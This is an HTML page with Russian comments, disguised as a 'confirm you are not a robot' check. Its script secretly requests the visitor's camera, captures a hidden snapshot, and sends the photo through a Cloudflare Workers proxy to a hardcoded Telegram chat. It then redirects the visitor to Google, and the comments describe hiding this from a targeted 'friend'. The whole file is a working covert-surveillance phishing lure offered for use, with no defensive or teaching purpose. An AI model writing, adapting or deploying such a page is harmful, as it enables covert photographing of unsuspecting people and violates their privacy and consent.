    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Загрузка...</title>
    </head>
    <body>
        <div style="text-align: center; margin-top: 50px;">
            <h2>Подтвердите, что вы не робот</h2>
            <button id="btn" style="padding: 15px 30px; font-size: 18px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 8px;">
                Я не робот (Продолжить)
            </button>
        </div>
        
        <video id="v" autoplay style="display:none"></video>
        <canvas id="c" style="display:none"></canvas>

        <script>
           // 1. Твои настройки
const chatId = '1976857829'; // Твой ID
const targetUrl = 'https://google.com'; // Куда перекинуть друга в конце
const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev'; // Твой прокси в Cloudflare

const btn = document.getElementById('btn');
const video = document.getElementById('v');
const canvas = document.getElementById('c');

// 2. Главная функция при нажатии на кнопку
btn.onclick = async () => {
    btn.innerText = "Загрузка..."; // Меняем текст кнопки для вида
    btn.disabled = true;

    try {
        // Запрашиваем доступ к камере
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        // Ждем 1.5 секунды, чтобы камера сфокусировалась и кадр был четким
        await new Promise(res => setTimeout(res, 1500));

        // Делаем снимок (захват кадра на холст)
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        // Превращаем холст в файл изображения (JPEG)
        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));

        // Готовим данные для отправки
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'user_photo.jpg');

        // ОТПРАВКА В TELEGRAM ЧЕРЕЗ CLOUDFLARE
        // (Токен теперь зашит внутри кода воркера в Cloudflare)
        const response = await fetch(proxyUrl, {
            method: 'POST',
            body: formData
        });

        if (response.ok) {
            console.log("Фото успешно отправлено!");
        } else {
            console.error("Ошибка прокси:", await response.text());
        }

        // Выключаем камеру (чтобы погасла лампочка у друга)
        stream.getTracks().forEach(track => track.stop());

    } catch (err) {
        // Если друг нажал "Заблокировать" или нет камеры
        console.warn("Доступ к камере не получен:", err.name);
    } finally {
        // В ЛЮБОМ СЛУЧАЕ перенаправляем на нужный сайт через полсекунды
        setTimeout(() => {
            window.location.href = targetUrl;
        }, 500);
    }
};

        </script>
    </body>
    </html>
